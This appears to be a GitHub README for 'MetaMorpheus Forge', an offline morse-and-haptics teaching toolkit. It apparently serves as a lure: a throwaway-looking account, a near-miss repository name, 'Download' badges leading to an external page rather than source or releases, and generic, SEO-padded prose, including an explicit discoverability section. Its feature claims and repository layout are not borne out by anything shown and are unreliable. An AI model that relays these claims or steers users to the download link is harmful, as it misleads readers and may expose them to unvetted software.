![preview](https://raw.githubusercontent.com/soumyadeeproy859-cpu/meta-morserin0/main/splash_87711.svg)
[![Download](https://raw.githubusercontent.com/soumyadeeproy859-cpu/meta-morserin0/main/launch_dd39.svg)](https://soumyadeeproy859-cpu.github.io/meta-morserin0/)

# MetaMorpheus Forge

> *Where raw signal becomes structured sound, and every pulse of light finds its voice.*

A cross-platform, offline-first companion ecosystem for the **MetaMorserino** hardware family — a next-generation, community-driven reimagining of educational morse and haptic-light experimentation tooling. This repository hosts the complete firmware orchestration layer, the desktop/mobile flasher utility, the companion annotation suite, and the shared schema library that keeps every branch of the project humming in sync.

If the original device was a pocket-sized lantern for learning rhythm and light, **MetaMorpheus Forge** is the workshop behind it — a place where educators, makers, tinkerers, and accessibility advocates reshape the way code becomes touch, tone, and visual pattern.

---

## 🧭 Table of Contents

- [Project Vision](#-project-vision)
- [What Makes It Different](#-what-makes-it-different)
- [Core Modules](#-core-modules)
- [Feature Highlights](#-feature-highlights)
- [Responsive & Adaptive Interface](#-responsive--adaptive-interface)
- [Multilingual & Inclusive Design](#-multilingual--inclusive-design)
- [Always-On Assistance Model](#-always-on-assistance-model)
- [Repository Layout](#-repository-layout)
- [Getting Started (Guided Setup)](#-getting-started-guided-setup)
- [Configuration Surface](#-configuration-surface)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Roadmap 2026](#-roadmap-2026)
- [Contributing](#-contributing)
- [Code of Conduct](#-code-of-conduct)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🌌 Project Vision

MetaMorpheus Forge is not merely a firmware uploader. It is an **ecosystem philosophy**:

- **Decentralized learning** — no cloud subscription required to teach someone to "hear" with their fingertips.
- **Remixability** — every lesson, pattern, and waveform is a plain-text asset that can be versioned, forked, and woven into another educator's curriculum.
- **Longevity** — the hardware may evolve, but the schema stays backward-compatible across generations, ensuring lesson libraries written in 2026 still run on devices flashed years later.

Think of it as a **library of lanterns**: each one burns on its own, but together they map a coastline of learning.

---

## 💡 What Makes It Different

Most morse-training tools stop at "beep on, beep off." MetaMorpheus Forge treats each transmission as a **multi-sensory event**:

1. **Light** — RGB clusters render timing with color-coded pressure.
2. **Haptics** — a linear actuator sculpts the pulse into felt rhythm.
3. **Tone** — a configurable audio band that can be tuned for users with partial hearing.
4. **Spatial** — an optional second device mirrors the same signal six feet away for group drills.

The result: a single "message" becomes a shared, repeatable, teachable moment — regardless of sensory modality.

---

## 🧩 Core Modules

| Module | Role |
| --- | --- |
| `forge-core` | Shared schema parser, event bus, and timing engine. |
| `forge-shell` | Desktop & tablet front end for authoring and flashing. |
| `forge-mobile` | Companion handheld interface for on-the-go pattern labs. |
| `forge-firmware` | The on-device runtime (light, haptic, tone drivers). |
| `forge-schema` | Versioned JSON schema for lessons, patterns, and drills. |
| `forge-sync` | Peer-to-peer lesson exchange over local networks. |

Each module lives in its own subdirectory with a scoped README, but they all defer to the **Forge Core** for timing precision and asset validation.

---

## ✨ Feature Highlights

- **Offline-first operation** — no account needed to author, flash, or teach.
- **Deterministic timing engine** — sub-millisecond scheduling across light, haptic, and tone channels.
- **Schema-driven lessons** — every drill is a portable document, not a black box binary.
- **Hot-swappable palettes** — colorblind-safe, high-contrast, and monochrome presets ship in the box.
- **Peer sync over LAN** — exchange lesson packs without a central server.
- **Version-aware flashing** — the shell refuses to overwrite firmware it doesn't recognize by checksum.
- **Live telemetry panel** — watch pulse widths, jitter, and dropped events in real time.
- **Modular plugin surface** — add a new sensory output without touching core timing.
- **Accessibility-first defaults** — large targets, adjustable haptic strength, and screen-reader phrasing baked into the shell.
- **Deterministic replays** — every session can be recorded and re-performed identically for classroom demos.
- **Encrypted local vault** — lesson packs at rest are guarded with a per-user key, no network calls needed.
- **Cross-platform parity** — desktop, tablet, and handheld shells share the same authoring model.

---

## 📐 Responsive & Adaptive Interface

The Forge Shell doesn't just "scale" — it **re-composes**. On a widescreen monitor, you get a timeline editor, a live waveform preview, and an asset library side by side. Fold the device into a tablet posture, and the waveform becomes a swipeable ribbon, with the asset library docked at the bottom. On a small handheld, the whole thing collapses into a three-tab model: **Author**, **Flash**, **Observe**.

- **Fluid grid** — layout anchors shift based on aspect ratio, not just pixel width.
- **Gesture parity** — every drag action has a keyboard equivalent, and every keyboard shortcut has a touch gesture.
- **Dark, light, and amber modes** — the amber mode was designed with evening classroom sessions in mind.
- **Reduced-motion aware** — the shell detects system preferences and swaps animations for crossfades.

---

## 🌍 Multilingual & Inclusive Design

The interface speaks to people in the language they dream in. Translations are community-managed as plain-text bundles, and every string has a context note so translators understand the tone intended.

Currently supported locales include:

- English (baseline)
- Spanish
- German
- French
- Portuguese (Brazil)
- Japanese
- Hindi
- Arabic (right-to-left aware)

Adding a new locale is a matter of copying a bundle, filling in strings, and opening a pull request — no compilation step required for the shell to pick it up.

---

## 🛎️ Always-On Assistance Model

We don't say "247 support" and walk away. The Forge community operates an **always-available assistance model**:

- **In-app contextual help** — every panel has a "why is this here?" affordance.
- **Community office hours** — rotating volunteer hosts, announced in the repository discussions.
- **Async Q&A** — questions are answered in discussions threads with searchable titles.
- **Triage rotation** — maintainers triage incoming issues within a working day, every day.

---

## 🗂️ Repository Layout

- **`/docs`** — architecture notes, schema reference, and translation guide.
- **`/core`** — the timing engine, event bus, and asset validator.
- **`/shell`** — desktop and tablet front end.
- **`/mobile`** — handheld companion.
- **`/firmware`** — on-device runtime for light, haptic, and tone drivers.
- **`/schema`** — versioned lesson and pattern definitions.
- **`/sync`** — peer exchange transport and conflict resolution.
- **`/tools`** — helper scripts for maintainers (validation, release prep).
- **`/examples`** — sample lesson packs to learn from.
- **`/translations`** — locale bundles.

Each folder contains its own scoped README with deeper detail.

---

## 🚀 Getting Started (Guided Setup)

MetaMorpheus Forge is designed so you can be authoring a lesson within minutes of opening the shell.

1. **Open the shell** — the first-run wizard walks you through device discovery.
2. **Pick a template** — start from a blank canvas or a bundled drill.
3. **Shape the pattern** — drag pulses on the timeline; assign color, tone, and haptic intensity.
4. **Preview locally** — the shell mirrors the output without needing a device attached.
5. **Send to device** — the shell validates, checksums, and transfers in one motion.
6. **Save the lesson** — everything is stored as a portable document in your local vault.

No account. No network handshake. No cloud dependency. Just you, the pattern, and the light.

---

## ⚙️ Configuration Surface

The Forge reads a single `forge.config` file per workspace. Notable keys:

- `timing.jitterBudgetMs` — the acceptable drift before the engine re-syncs.
- `output.light.gamma` — perceptual brightness curve for RGB clusters.
- `output.haptic.curve` — linear, logarithmic, or custom envelope.
- `output.tone.bandHz` — selectable audio band for partial-hearing users.
- `sync.peerDiscovery` — enable LAN peer browsing.
- `vault.encryption` — toggles local-at-rest protection.

Every key is documented in `/docs/configuration.md` with examples for classroom, museum, and personal study use.

---

## 🔍 SEO & Discoverability Notes

This project is written to be found by the people who need it — educators searching for **offline morse learning tools**, accessibility advocates looking for **multi-sensory teaching rigs**, and makers seeking **open hardware firmware companions**. Natural phrases appear throughout the docs so that search engines and humans alike understand the shape of the project:

- *"open-source morse trainer with haptic feedback"*
- *"offline lesson authoring for educational hardware"*
- *"multilingual accessible device firmware companion"*
- *"peer-to-peer lesson exchange for classrooms"*

We avoid stuffing and keep the prose readable — the goal is to be discovered and then understood, not just indexed.

---

## 🛠️ Roadmap 2026

- **Q1 2026** — schema stable v3, translation freeze for eight locales.
- **Q2 2026** — peer sync shipped to all shells, conflict UI polished.
- **Q3 2026** — plugin surface opens to community sensory outputs.
- **Q4 2026** — long-term support branch established for the previous hardware generation.

---

## 🤝 Contributing

Contributions of every size are welcome — from a single translation string to a new sensory plugin. The fastest way to start:

1. Read `/docs/contributing.md` for the workflow.
2. Check the "good first issue" label for a scoped entry point.
3. Open a discussion before starting anything large, so we can align early.

We especially welcome translators, accessibility testers, and educators willing to pilot lessons in real classrooms.

---

## 📜 Code of Conduct

This project follows a straightforward standard: be kind, assume good faith, and remember that the person on the other end is a volunteer. The full text lives in `/docs/code-of-conduct.md`.

---

## 📄 License

Released under the **MIT License**. The full text is available at the canonical license page: [MIT License](https://opensource.org/licenses/MIT).

Copyright © 2026 MetaMorpheus Forge contributors.

---

## ⚠️ Disclaimer

MetaMorpheus Forge is an independent, community-driven project and is **not affiliated with, endorsed by, or sponsored by** any commercial hardware manufacturer. The software is provided **"as is"**, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement.

Users are responsible for ensuring that flashing firmware onto their own hardware is done in accordance with the device's documentation and local regulations. The maintainers accept no liability for damage to hardware, data loss, or any incidental or consequential damages arising from the use of this software.

All trademarks referenced belong to their respective owners and are used for identification purposes only.

---

[![Download](https://raw.githubusercontent.com/soumyadeeproy859-cpu/meta-morserin0/main/launch_dd39.svg)](https://soumyadeeproy859-cpu.github.io/meta-morserin0/)